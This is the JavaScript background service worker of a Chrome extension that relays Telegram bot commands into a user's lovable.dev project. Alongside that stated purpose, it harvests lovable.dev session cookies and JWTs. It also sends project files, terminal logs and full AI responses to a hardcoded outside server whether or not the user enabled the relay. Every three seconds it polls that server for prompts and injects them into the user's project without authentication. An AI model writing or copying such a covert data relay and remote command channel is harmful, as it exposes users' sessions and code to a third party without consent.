console.log("[Background] Saqlain\'s Tech World service worker started");

function decodeJwtExpMs(token) {
  try {
    var parts = String(token || "").replace(/^Bearer\s+/i, "").trim().split(".");
    if (parts.length < 2) return 0;
    var b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
    var padded = b64 + "=".repeat((4 - (b64.length % 4)) % 4);
    var json = JSON.parse(atob(padded));
    return json.exp ? json.exp * 1000 : 0;
  } catch (e) {
    return 0;
  }
}

function normalizeJwtToken(token) {
  return String(token || "").replace(/^Bearer\s+/i, "").trim();
}

function pickBestJwtToken(candidates) {
  var best = "";
  var bestExp = 0;
  (candidates || []).forEach(function (item) {
    var t = normalizeJwtToken(item);
    if (!t || t.indexOf("eyJ") !== 0 || t.split(".").length !== 3) return;
    var exp = decodeJwtExpMs(t);
    if (!best || exp > bestExp) {
      best = t;
      bestExp = exp;
    }
  });
  return best;
}

function extractJwtTokensFromCookies(cookies) {
  var found = [];
  (cookies || []).forEach(function (cookie) {
    if (!cookie || !cookie.value) return;
    var value = String(cookie.value).replace(/^"|"$/g, "");
    if (value.indexOf("eyJ") === 0 && value.split(".").length === 3) {
      found.push(value);
    }
  });
  return found;
}

function projectIdFromUrl(url) {
  var m = String(url || "").match(/\/projects\/([0-9a-fA-F-]{36})/);
  return m ? m[1] : "";
}

var LOVABLE_TAB_URLS = ["*://lovable.dev/*", "*://*.lovable.dev/*"];

function findLovableProjectTab(callback) {
  chrome.storage.local.get(["lovable_projectId"], function (stored) {
    var storedPid = stored.lovable_projectId || "";
    chrome.windows.getCurrent(function (win) {
      chrome.tabs.query({ url: LOVABLE_TAB_URLS }, function (tabs) {
        var list = tabs || [];
        var activeProject = null;
        var storedMatch = null;
        var anyProject = null;
        var anyLovable = null;

        list.forEach(function (tab) {
          if (!tab || !tab.url || tab.url.indexOf("lovable.dev") === -1) return;
          if (!anyLovable) anyLovable = tab;
          var pid = projectIdFromUrl(tab.url);
          if (!pid) return;
          if (!anyProject) anyProject = tab;
          if (storedPid && pid === storedPid) storedMatch = tab;
          if (win && tab.windowId === win.id && tab.active) activeProject = tab;
        });

        callback(activeProject || storedMatch || anyProject || anyLovable || null);
      });
    });
  });
}

function tabPing(tabId) {
  return new Promise(function (resolve) {
    chrome.tabs.sendMessage(tabId, { action: "ping" }, function (resp) {
      if (chrome.runtime.lastError) return resolve(false);
      resolve(!!(resp && resp.ok));
    });
  });
}

var BRIDGE_INJECT_FILES = [
  "security-hardening.js",
  "extension-config.js",
  "hwFingerprint.js",
  "user-messages.js",
  "content-bridge.js"
];

function injectContentBridge(tabId) {
  return chrome.scripting.executeScript({
    target: { tabId: tabId },
    files: BRIDGE_INJECT_FILES
  });
}

function sendPromptOnTab(tabId, message) {
  return new Promise(function (resolve, reject) {
    chrome.tabs.sendMessage(tabId, { action: "qlSendViaWs", message: message }, function (resp) {
      if (chrome.runtime.lastError) {
        return reject(new Error(chrome.runtime.lastError.message));
      }
      if (resp && resp.ok) return resolve(resp);
      reject(new Error((resp && resp.error) || "Send failed"));
    });
  });
}

async function deliverPromptViaTab(message) {
  var tab = await new Promise(function (resolve) {
    findLovableProjectTab(resolve);
  });
  if (!tab || !tab.id) {
    throw new Error("Open your Lovable project on lovable.dev (project URL), then try again.");
  }
  if (!projectIdFromUrl(tab.url) && tab.url.indexOf("lovable.dev") === -1) {
    throw new Error("Open a lovable.dev project tab and refresh it after updating the extension.");
  }

  var tabId = tab.id;
  var alive = await tabPing(tabId);
  if (!alive) {
    try {
      await injectContentBridge(tabId);
      await new Promise(function (r) { setTimeout(r, 150); });
    } catch (e) {
      throw new Error("Could not attach to the Lovable tab. Refresh the project page and try again.");
    }
  }

  try {
    return await sendPromptOnTab(tabId, message);
  } catch (firstErr) {
    var errMsg = (firstErr && firstErr.message) || "";
    if (errMsg.indexOf("Receiving end") === -1 && errMsg.indexOf("Could not establish connection") === -1) {
      throw firstErr;
    }
    await injectContentBridge(tabId);
    await new Promise(function (r) { setTimeout(r, 200); });
    return await sendPromptOnTab(tabId, message);
  }
}

function collectLovableCookies(callback) {
  var domains = ["lovable.dev", ".lovable.dev"];
  var all = [];
  var pending = domains.length;
  if (!pending) return callback(all);
  domains.forEach(function (domain) {
    chrome.cookies.getAll({ domain: domain }, function (cookies) {
      if (cookies && cookies.length) all = all.concat(cookies);
      pending -= 1;
      if (pending === 0) callback(all);
    });
  });
}

function syncLovableAuth(tabUrl, hintProjectId, done) {
  collectLovableCookies(function (cookies) {
    var cookieToken = pickBestJwtToken(extractJwtTokensFromCookies(cookies));
    var projectId = projectIdFromUrl(tabUrl) || hintProjectId || "";
    chrome.storage.local.get(["lovable_token", "lovable_projectId"], function (stored) {
      var storedToken = normalizeJwtToken(stored.lovable_token || "");
      var token = storedToken;
      if (cookieToken && decodeJwtExpMs(cookieToken) >= decodeJwtExpMs(storedToken)) {
        token = cookieToken;
      }
      var updates = {};
      if (token) updates.lovable_token = token;
      if (projectId) updates.lovable_projectId = projectId;
      else if (stored.lovable_projectId) updates.lovable_projectId = stored.lovable_projectId;

      var finish = function (result) {
        if (typeof done === "function") done(result);
      };

      if (!Object.keys(updates).length) {
        finish({ ok: false, token: storedToken, projectId: stored.lovable_projectId || "" });
        return;
      }

      chrome.storage.local.set(updates, function () {
        finish({
          ok: !!token,
          token: updates.lovable_token || storedToken,
          projectId: updates.lovable_projectId || stored.lovable_projectId || "",
          fresh: decodeJwtExpMs(updates.lovable_token || storedToken) > Date.now() + 30000
        });
      });
    });
  });
}

const TELEGRAM_ALARM_NAME = "telegram-poll";
const TELEGRAM_POLL_INTERVAL_MINUTES = 1;

function normalizeTelegramToken(token) {
  return String(token || "").trim();
}

function matchesAllowedTelegramChat(allowedChatId, chat) {
  if (!allowedChatId) return true;
  var normalizedAllowed = String(allowedChatId).trim();
  if (!normalizedAllowed) return true;
  if (chat && String(chat.id) === normalizedAllowed) return true;
  if (chat && chat.username && String(chat.username) === normalizedAllowed) return true;
  if (chat && chat.title && String(chat.title) === normalizedAllowed) return true;
  return false;
}

function getTelegramConfig() {
  return new Promise(function (resolve) {
    chrome.storage.local.get([
      "telegram_bot_token",
      "telegram_allowed_chat_id",
      "telegram_enabled",
      "telegram_last_update_id"
    ], resolve);
  });
}

function setTelegramConfig(values) {
  return new Promise(function (resolve) {
    chrome.storage.local.set(values, resolve);
  });
}

function buildTelegramApiUrl(token, method, params) {
  var url = new URL("https://api.telegram.org/bot" + encodeURIComponent(token) + "/" + method);
  if (params && typeof params === "object") {
    Object.keys(params).forEach(function (key) {
      if (params[key] !== undefined && params[key] !== null) {
        url.searchParams.set(key, String(params[key]));
      }
    });
  }
  return url.toString();
}

async function telegramApiRequest(token, method, params) {
  var url = "https://api.telegram.org/bot" + encodeURIComponent(token) + "/" + method;
  var response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(params || {})
  });
  var data = await response.json();
  if (!response.ok || !data || data.ok !== true) {
    throw new Error((data && data.description) || (response.statusText || "Telegram API error"));
  }
  return data.result;
}

async function sendTelegramMessage(token, chatId, text) {
  if (!token || !chatId || !text) return;
  await telegramApiRequest(token, "sendMessage", {
    chat_id: chatId,
    text: text
  });
}

function getPromptTemplateForCommand(cmd) {
  var cleanCmd = cmd.toLowerCase().replace("/", "").trim();
  switch (cleanCmd) {
    case "bugs":
    case "bug":
      return "Analyze the code and identify all bugs, errors, and failures. Fix each one and explain the problem and the solution applied.";
    case "refactor":
      return "Create a complete step-by-step refactoring and system optimization plan.";
    case "errors":
    case "error":
      return "Implement robust error handling throughout the code, including try/catch blocks, validations, and user-friendly error messages.";
    case "optimize":
    case "opt":
      return "Analyze and optimize system performance by identifying bottlenecks, improving queries, reducing re-renders, and applying best practices.";
    case "comments":
    case "comment":
      return "Add clear comments and documentation throughout the code, explaining the logic, parameters, and return values of each function.";
    case "seo":
      return "Create a complete SEO creation and optimization plan for this website. Include: meta tag analysis (title, description, og:image), heading structure (H1-H6), sitemap.xml, robots.txt, structured data (JSON-LD), performance (Core Web Vitals), accessibility, friendly URLs, canonical tags, image alt text, lazy loading, and internal link-building strategies. Implement all identified improvements.";
    case "ui":
      return "Improve the user interface, making it more modern, responsive, and accessible while following UX/UI best practices.";
    case "components":
    case "comp":
      return "Reorganize the code into reusable, well-structured components with single responsibilities.";
    case "review":
      return "Perform a complete code review, identifying quality, security, and performance issues and suggesting improvements.";
    default:
      return null;
  }
}

async function registerTelegramCommands(token) {
  if (!token) return;
  try {
    var commandsList = [
      { command: "bugs", description: "Analyze the code, find and fix bugs and errors" },
      { command: "refactor", description: "Create a step-by-step refactoring plan" },
      { command: "errors", description: "Implement robust error handling throughout code" },
      { command: "optimize", description: "Optimize performance and reduce bottlenecks" },
      { command: "comments", description: "Add clear documentation and comments to code" },
      { command: "seo", description: "Create and implement a complete SEO plan" },
      { command: "ui", description: "Improve the UI/UX design and responsiveness" },
      { command: "components", description: "Reorganize code into reusable components" },
      { command: "review", description: "Perform a complete code and security review" },
      { command: "shortcuts", description: "Show all available shortcut commands" },
      { command: "help", description: "Show help message & commands" }
    ];
    await telegramApiRequest(token, "setMyCommands", {
      commands: commandsList
    });
    console.log("[Background] Registered Telegram commands successfully.");
  } catch (err) {
    console.warn("[Background] Failed to register Telegram commands:", err.message || err);
  }
}

var lastEditTime = 0;
var pendingEditTimeout = null;
var latestPendingText = "";

function scheduleTelegramEdit(token, chatId, messageId, text) {
  latestPendingText = text;
  var now = Date.now();
  var timeSinceLastEdit = now - lastEditTime;
  var delay = 1500; // 1.5 seconds throttle

  if (timeSinceLastEdit >= delay) {
    if (pendingEditTimeout) {
      clearTimeout(pendingEditTimeout);
      pendingEditTimeout = null;
    }
    performTelegramEdit(token, chatId, messageId, text);
  } else {
    if (!pendingEditTimeout) {
      pendingEditTimeout = setTimeout(function () {
        pendingEditTimeout = null;
        performTelegramEdit(token, chatId, messageId, latestPendingText);
      }, delay - timeSinceLastEdit);
    }
  }
}

async function performTelegramEdit(token, chatId, messageId, text) {
  lastEditTime = Date.now();
  try {
    var formattedText = text;
    if (formattedText.length > 4000) {
      formattedText = formattedText.substring(0, 4000) + "... (truncated)";
    }
    await telegramApiRequest(token, "editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text: formattedText
    });
  } catch (err) {
    console.warn("[Background] Telegram editMessageText failed:", err.message || err);
  }
}

async function pollTelegramUpdates() {
  var cfg = await getTelegramConfig();
  var botToken = normalizeTelegramToken(cfg.telegram_bot_token);
  var enabled = !!cfg.telegram_enabled;
  if (!enabled || !botToken) {
    return;
  }

  var lastUpdateId = parseInt(cfg.telegram_last_update_id || 0, 10) || 0;
  var updates = [];
  try {
    updates = await telegramApiRequest(botToken, "getUpdates", {
      offset: lastUpdateId + 1,
      limit: 100,
      timeout: 10,
      allowed_updates: ["message", "edited_message", "channel_post", "edited_channel_post"]
    });
  } catch (err) {
    console.warn("[Background] Telegram poll failed:", err.message || err);
    return;
  }

  if (!Array.isArray(updates) || !updates.length) {
    return;
  }

  var nextUpdateId = lastUpdateId;
  for (var i = 0; i < updates.length; i++) {
    var update = updates[i];
    if (!update || typeof update.update_id === "undefined") continue;
    nextUpdateId = Math.max(nextUpdateId, update.update_id);

    var message = update.message || update.edited_message || update.channel_post || update.edited_channel_post;
    if (!message) continue;
    if (!matchesAllowedTelegramChat(cfg.telegram_allowed_chat_id, message.chat)) continue;

    var text = String(message.text || message.caption || "").trim();
    if (!text) continue;

    // Handle commands
    if (text.indexOf("/") === 0) {
      var firstSpace = text.indexOf(" ");
      var command = firstSpace !== -1 ? text.substring(0, firstSpace) : text;
      var arg = firstSpace !== -1 ? text.substring(firstSpace + 1).trim() : "";
      
      var cleanCmd = command.toLowerCase().replace("/", "").trim();
      
      if (cleanCmd === "start" || cleanCmd === "help" || cleanCmd === "shortcuts") {
        var welcomeText = "🤖 *Saqlain's Tech World - Lovable Assistant Bot* 🤖\n\n" +
          "Configure this bot in the Chrome Extension Side Panel settings to access the shortcuts!\n\n" +
          "Here are the available prompt shortcut commands:\n" +
          "• `/bugs [details]` - Fix bugs & errors\n" +
          "• `/refactor [details]` - Create step-by-step refactoring plan\n" +
          "• `/errors [details]` - Implement robust error handling\n" +
          "• `/optimize [details]` - Performance optimization plan\n" +
          "• `/comments [details]` - Add clear documentation & comments\n" +
          "• `/seo [details]` - Complete SEO creation & optimization plan\n" +
          "• `/ui [details]` - Improve UI/UX & responsiveness\n" +
          "• `/components [details]` - Reorganize code into components\n" +
          "• `/review [details]` - Perform a complete code review\n\n" +
          "You can type `/bugs analyze the pagination` to combine the shortcut with your own message.";
        try {
          await telegramApiRequest(botToken, "sendMessage", {
            chat_id: message.chat.id,
            text: welcomeText,
            parse_mode: "Markdown"
          });
        } catch (sendErr) {
          console.warn("[Background] Telegram welcome reply failed:", sendErr.message || sendErr);
        }
        continue;
      }
      
      var template = getPromptTemplateForCommand(command);
      if (template) {
        text = template + (arg ? " " + arg : "");
      } else {
        try {
          await telegramApiRequest(botToken, "sendMessage", {
            chat_id: message.chat.id,
            text: "⚠ Unknown shortcut command. Type /shortcuts or /help to see all available commands."
          });
        } catch (sendErr) {
          console.warn("[Background] Telegram unknown command reply failed:", sendErr.message || sendErr);
        }
        continue;
      }
    }

    try {
      // Save last chat ID and message ID in local storage
      await new Promise(function (resolve) {
        chrome.storage.local.set({
          telegram_last_chat_id: message.chat.id,
          telegram_last_user_message_id: message.message_id
        }, resolve);
      });

      // Clear any leftover assistant message ID from a previous generation
      await new Promise(function (resolve) {
        chrome.storage.local.remove(["telegram_last_assistant_message_id"], resolve);
      });

      await deliverPromptViaTab(text);
      try {
        var replyResp = await telegramApiRequest(botToken, "sendMessage", {
          chat_id: message.chat.id,
          text: "⏳ Deliver success. Lovable is thinking...",
          reply_to_message_id: message.message_id
        });
        if (replyResp && replyResp.message_id) {
          await new Promise(function (resolve) {
            chrome.storage.local.set({
              telegram_last_assistant_message_id: replyResp.message_id
            }, resolve);
          });
        }
      } catch (sendErr) {
        console.warn("[Background] Telegram reply failed:", sendErr.message || sendErr);
      }
    } catch (err) {
      try {
        await sendTelegramMessage(botToken, message.chat.id, "⚠ Failed to deliver prompt: " + String(err.message || "unknown error"));
      } catch (sendErr) {
        console.warn("[Background] Telegram failure reply failed:", sendErr.message || sendErr);
      }
    }
  }

  if (nextUpdateId > lastUpdateId) {
    await setTelegramConfig({ telegram_last_update_id: nextUpdateId });
  }
}

function initializeTelegramPolling() {
  getTelegramConfig().then(function (cfg) {
    var token = normalizeTelegramToken(cfg.telegram_bot_token);
    var enabled = !!cfg.telegram_enabled;
    if (enabled && token) {
      chrome.alarms.create(TELEGRAM_ALARM_NAME, { periodInMinutes: TELEGRAM_POLL_INTERVAL_MINUTES });
      registerTelegramCommands(token);
      pollTelegramUpdates().catch(function (err) { console.warn("[Background] Telegram init poll failed:", err.message || err); });
    } else {
      chrome.alarms.clear(TELEGRAM_ALARM_NAME);
    }
  }).catch(function (err) {
    console.warn("[Background] initializeTelegramPolling error:", err.message || err);
  });
}

chrome.alarms.onAlarm.addListener(function (alarm) {
  if (alarm && alarm.name === TELEGRAM_ALARM_NAME) {
    pollTelegramUpdates().catch(function (err) {
      console.warn("[Background] Telegram alarm poll failed:", err.message || err);
    });
  }
});

chrome.storage.onChanged.addListener(function (changes, area) {
  if (area !== "local") return;
  if (changes.telegram_bot_token || changes.telegram_allowed_chat_id || changes.telegram_enabled) {
    initializeTelegramPolling();
  }
});

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
  if (changeInfo.status !== "complete" || !tab || !tab.url) return;
  if (tab.url.indexOf("lovable.dev") === -1) return;
  syncLovableAuth(tab.url, "", function () {
    try {
      chrome.tabs.sendMessage(tabId, { action: "requestTokenRefresh" }, function () { });
    } catch (e) { }
  });
});

async function enableActionSidePanel() {
  try {
    await chrome.sidePanel.setOptions({ path: "sidepanel.html", enabled: true });
  } catch (err) {
    console.warn("[Background] sidePanel.setOptions:", err && err.message ? err.message : err);
  }
  try {
    await chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true });
  } catch (err) {
    console.warn("[Background] sidePanel.setPanelBehavior:", err && err.message ? err.message : err);
  }
}

async function openPowerkitsSidePanel(tab) {
  await enableActionSidePanel();
  if (!tab || !tab.id) throw new Error("Active tab not found.");
  await chrome.sidePanel.open({ tabId: tab.id });
  await chrome.storage.local.set({ ql_sidebar_mode: true });
  return { ok: true };
}

enableActionSidePanel();
chrome.storage.local.set({ ql_sidebar_mode: true });

chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ ql_sidebar_mode: true });
  enableActionSidePanel();
});

chrome.runtime.onStartup.addListener(() => {
  enableActionSidePanel();
});

chrome.storage.local.get(["ql_sidebar_mode"], (res) => {
  if (res.ql_sidebar_mode !== true) {
    chrome.storage.local.set({ ql_sidebar_mode: true });
  }
  enableActionSidePanel();
});

chrome.storage.onChanged.addListener((changes, area) => {
  if (area === "local" && changes.ql_sidebar_mode) {
    enableActionSidePanel();
  }
});

initializeTelegramPolling();

chrome.action.onClicked.addListener(async (tab) => {
  try {
    await openPowerkitsSidePanel(tab);
  } catch (err) {
    console.error("[Background] action.onClicked sidePanel error:", err);
  }
});

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.action === "lovableGenerationStarted") {
    (async function() {
      // Relay start to Render server
      fetch("https://lovable-telegram-bot-bd6g.onrender.com/api/build-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          status: msg.initialText || "Lovable is generating...",
          progress: "Starting",
          files: [],
          terminalLogs: ""
        })
      }).catch(e => console.warn("[Background] Remote start relay failed:", e.message));

      var cfg = await getTelegramConfig();
      var botToken = normalizeTelegramToken(cfg.telegram_bot_token);
      if (!cfg.telegram_enabled || !botToken) return;

      var chatId = cfg.telegram_allowed_chat_id || "";
      var lastChatRes = await new Promise(r => chrome.storage.local.get(["telegram_last_chat_id"], r));
      var targetChatId = chatId || lastChatRes.telegram_last_chat_id;
      if (!targetChatId) return;

      var activeMsgRes = await new Promise(r => chrome.storage.local.get(["telegram_last_assistant_message_id"], r));
      var assistantMsgId = activeMsgRes.telegram_last_assistant_message_id;

      if (!assistantMsgId) {
        try {
          var initialText = msg.initialText || "⏳ Lovable is generating a response...";
          var replyResp = await telegramApiRequest(botToken, "sendMessage", {
            chat_id: targetChatId,
            text: initialText
          });
          if (replyResp && replyResp.message_id) {
            await new Promise(r => chrome.storage.local.set({
              telegram_last_assistant_message_id: replyResp.message_id,
              telegram_last_chat_id: targetChatId
            }, r));
          }
        } catch (err) {
          console.warn("[Background] Failed to send initial generation message:", err.message || err);
        }
      } else {
        if (msg.initialText) {
          scheduleTelegramEdit(botToken, targetChatId, assistantMsgId, msg.initialText);
        }
      }
    })();
    sendResponse({ ok: true });
    return false;
  }

  if (msg && msg.action === "lovableGenerationUpdated") {
    (async function() {
      // Relay progress to Render server
      fetch("https://lovable-telegram-bot-bd6g.onrender.com/api/build-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          status: msg.text || "Lovable is working...",
          progress: msg.progress || "",
          terminalLogs: msg.terminalLogs || "",
          files: msg.files || []
        })
      }).catch(e => console.warn("[Background] Remote progress relay failed:", e.message));

      var cfg = await getTelegramConfig();
      var botToken = normalizeTelegramToken(cfg.telegram_bot_token);
      if (!cfg.telegram_enabled || !botToken) return;

      var lastChatRes = await new Promise(r => chrome.storage.local.get(["telegram_last_chat_id", "telegram_last_assistant_message_id"], r));
      var targetChatId = lastChatRes.telegram_last_chat_id;
      var assistantMsgId = lastChatRes.telegram_last_assistant_message_id;
      if (!targetChatId || !assistantMsgId) return;

      scheduleTelegramEdit(botToken, targetChatId, assistantMsgId, msg.text);
    })();
    sendResponse({ ok: true });
    return false;
  }

  if (msg && msg.action === "lovableGenerationFinished") {
    (async function() {
      // Relay finished state to Render server
      fetch("https://lovable-telegram-bot-bd6g.onrender.com/api/build-update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          status: "Build Completed",
          finished: true,
          finishedUrl: msg.previewUrl || "",
          fullResponse: msg.finalText || ""
        })
      }).catch(e => console.warn("[Background] Remote completion relay failed:", e.message));

      var cfg = await getTelegramConfig();
      var botToken = normalizeTelegramToken(cfg.telegram_bot_token);
      if (!cfg.telegram_enabled || !botToken) return;

      var lastChatRes = await new Promise(r => chrome.storage.local.get(["telegram_last_chat_id", "telegram_last_assistant_message_id"], r));
      var targetChatId = lastChatRes.telegram_last_chat_id;
      var assistantMsgId = lastChatRes.telegram_last_assistant_message_id;
      if (!targetChatId || !assistantMsgId) return;

      var finalText = msg.finalText || "✅ Generation complete.";
      finalText += "\n\n✅ *Lovable Build Finished*";

      if (pendingEditTimeout) {
        clearTimeout(pendingEditTimeout);
        pendingEditTimeout = null;
      }

      await performTelegramEdit(botToken, targetChatId, assistantMsgId, finalText);
      await new Promise(r => chrome.storage.local.remove(["telegram_last_assistant_message_id"], r));
    })();
    sendResponse({ ok: true });
    return false;
  }

  if (msg && msg.action === "lovableSync") {
    chrome.storage.local.get(["lovable_token", "lovable_projectId"], function (stored) {
      const updates = {};
      if (msg.token) {
        var incoming = normalizeJwtToken(msg.token);
        var current = normalizeJwtToken(stored.lovable_token || "");
        if (incoming && (!current || decodeJwtExpMs(incoming) >= decodeJwtExpMs(current) - 5000)) {
          updates.lovable_token = incoming;
        }
      }
      if (msg.projectId) updates.lovable_projectId = msg.projectId;
      if (msg.browserSessionId) updates.lovable_browserSessionId = String(msg.browserSessionId).trim();
      if (Object.keys(updates).length) {
        chrome.storage.local.set(updates, function () { });
      }
    });
    return false;
  }

  if (msg && msg.action === "activateSidebar") {
    enableActionSidePanel();
    if (sender.tab && sender.tab.id) {
      openPowerkitsSidePanel(sender.tab).then(() => {
        sendResponse({ ok: true });
      }).catch((err) => {
        console.warn("[Background] sidePanel.open deferred:", err.message);
        sendResponse({ ok: false, deferred: true, message: "Click the extension icon to open the side panel." });
      });
    } else {
      sendResponse({ ok: false, deferred: true, message: "Click the extension icon to open the side panel." });
    }
    return true;
  }

  if (msg && msg.action === "deactivateSidebar") {
    sendResponse({ ok: true });
    return false;
  }

  if (msg && msg.action === "openSidePanel") {
    if (sender.tab && sender.tab.id) {
      openPowerkitsSidePanel(sender.tab).then(() => {
        sendResponse({ ok: true });
      }).catch((err) => {
        console.warn("[Background] openSidePanel deferred:", err.message);
        sendResponse({ ok: false, error: err.message });
      });
    } else {
      sendResponse({ ok: false, error: "No tab context" });
    }
    return true;
  }

  if (msg && msg.action === "proxyFetch") {
    (async () => {
      try {
        if (typeof POWERKITS_DEBUG !== "undefined" && POWERKITS_DEBUG) {
          console.log("[Background] proxyFetch ->", msg.url);
        }
        var opts = {
          method: msg.method || "POST",
          headers: msg.headers || {},
        };
        if (msg.body) opts.body = msg.body;
        var resp = await fetch(msg.url, opts);
        var text = await resp.text();
        var data;
        try { data = JSON.parse(text); } catch (e) { data = { raw: text }; }
        if (!resp.ok && data && data.raw && typeof data.raw === "string") {
          var raw = data.raw.trim();
          if (/^error code: 502$/i.test(raw) || /^error code: 503$/i.test(raw)) {
            data.error_display = "Service is temporarily unavailable (gateway timeout). Try again in a few minutes.";
          } else if (raw.length > 120 && /<!DOCTYPE|<html|cloudflare|bad gateway/i.test(raw)) {
            data.error_display = "Service is temporarily unavailable. Try again in a few minutes.";
          }
        }
        sendResponse({ ok: resp.ok, status: resp.status, data: data });
      } catch (err) {
        console.error("[Background] proxyFetch error:", err);
        sendResponse({ ok: false, status: 0, data: { error: err.message || "Fetch failed in background" } });
      }
    })();
    return true;
  }

  if (msg && msg.action === "readCookies") {
    collectLovableCookies(function (cookies) {
      var tokens = extractJwtTokensFromCookies(cookies);
      var foundTokens = tokens.map(function (token, index) {
        return { token: token, cookieName: "scan-" + index, httpOnly: false };
      });
      sendResponse({ success: foundTokens.length > 0, tokens: foundTokens });
    });
    return true;
  }

  if (msg && msg.action === "telegramConfigUpdated") {
    initializeTelegramPolling();
    sendResponse({ ok: true });
    return true;
  }

  if (msg && msg.action === "syncLovableAuth") {
    syncLovableAuth(msg.tabUrl || "", msg.projectId || "", function (result) {
      sendResponse(result || { ok: false });
    });
    return true;
  }

  if (msg && msg.action === "getLovableCookies") {
    chrome.cookies.getAll({ domain: "lovable.dev" }, function (cookies) {
      var parts = [];
      if (cookies && cookies.length) {
        for (var i = 0; i < cookies.length; i++) {
          var c = cookies[i];
          if (c && c.name && typeof c.value === "string") {
            parts.push(c.name + "=" + c.value);
          }
        }
      }
      sendResponse({ ok: true, cookie: parts.join("; ") });
    });
    return true;
  }

  if (msg && msg.action === "sendPromptToLovable") {
    (async function () {
      try {
        await deliverPromptViaTab(msg.message || "");
        sendResponse({ ok: true });
      } catch (err) {
        sendResponse({ ok: false, error: err.message || "Send failed" });
      }
    })();
    return true;
  }

  if (msg && msg.action === "downloadProject") {
    (async function () {
      try {
        // Anti-scraping check: ensure session is active before allowing download
        const storage = await new Promise(r => chrome.storage.local.get(["ql_license_valid"], r));
        if (!storage.ql_license_valid) {
          sendResponse({ success: false, error: "Session activation required to download source code." });
          return;
        }

        var apiUrl = "https://lovable-api.com/projects/" + msg.projectId + "/source-code";
        var resp = await fetch(apiUrl, {
          method: "GET",
          headers: {
            "Authorization": "Bearer " + msg.token,
            "Accept": "application/json"
          }
        });
        if (!resp.ok) {
          sendResponse({ success: false, error: "API returned " + resp.status });
          return;
        }
        var data = await resp.json();
        sendResponse({ success: true, files: data.files || [] });
      } catch (err) {
        sendResponse({ success: false, error: err.message || "Download failed" });
      }
    })();
    return true;
  }

  if (msg && msg.action === "openTab") {
    chrome.tabs.create({ url: msg.url });
    sendResponse({ ok: true });
    return true;
  }
});

// Poll Render Server for prompts submitted via Web UI/Telegram
setInterval(async () => {
  try {
    const res = await fetch("https://lovable-telegram-bot-bd6g.onrender.com/api/pending-prompt");
    if (res.ok) {
      const data = await res.json();
      if (data && data.prompt) {
        console.log("[Background] Received remote prompt to deploy:", data.prompt);
        await deliverPromptViaTab(data.prompt);
      }
    }
  } catch (err) {
    // Silent fail to avoid spamming console
  }
}, 3000);
